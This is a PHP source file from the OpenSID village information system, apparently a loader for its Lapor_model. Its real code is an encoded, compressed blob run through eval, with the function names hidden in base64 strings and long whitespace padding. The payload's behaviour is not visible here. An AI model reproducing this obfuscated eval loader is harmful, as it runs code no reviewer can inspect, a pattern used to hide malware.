<?php

/*
 *
 * File ini bagian dari:
 *
 * OpenSID
 *
 * Sistem informasi desa sumber terbuka untuk memajukan desa
 *
 * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
 *
 * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * Hak Cipta 2016 - 2021 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 *
 * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
 * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
 * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
 * asal tunduk pada syarat berikut:
 *
 * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
 * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
 * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
 *
 * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
 * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
 * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
 *
 * @package   OpenSID
 * @author    Tim Pengembang OpenDesa
 * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * @copyright Hak Cipta 2016 - 2021 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 * @license   http://www.gnu.org/licenses/gpl.html GPL V3
 * @link      https://github.com/OpenSID/OpenSID
 *
 */

$__ = 'printf'; $_ = 'Loading donjo-app/models/Lapor_model.php';

                                                                                                                                                                                                $_____ = '    b2JfZW5kX2NsZWFu'; $______________ = 'cmV0dXJuIGV2YWwoJF8pOw==';
$__________________                                                                                                                                                                                    = 'X19sYW1iZGE=';

                                                                                                                                                                                                                                          $______ = ' Z3p1bmNvbXByZXNz'; $___ = '  b2Jfc3RhcnQ='; $____ = 'b2JfZ2V0X2NvbnRlbnRz'; $__ = 'base64_decode'; $______ = $__($______); if (! function_exists('__lambda')) {
                                                                                                                                                                                                                                              function __lambda($sArgs, $sCode)
                                                                                                                                                                                                                                              {
                                                                                                                                                                                                                                                  return eval("return function({$sArgs}){{$sCode}};");
                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                          }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________ = $__($__________________); $______________ = $__($______________);
        $__________                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__________________('$_', $______________); $_____                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__($_____); $____                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__($____); $___                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__($___); $_                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = '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';

        $___(); $__________($______($__($_))); $________ = $____();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____(); echo $________;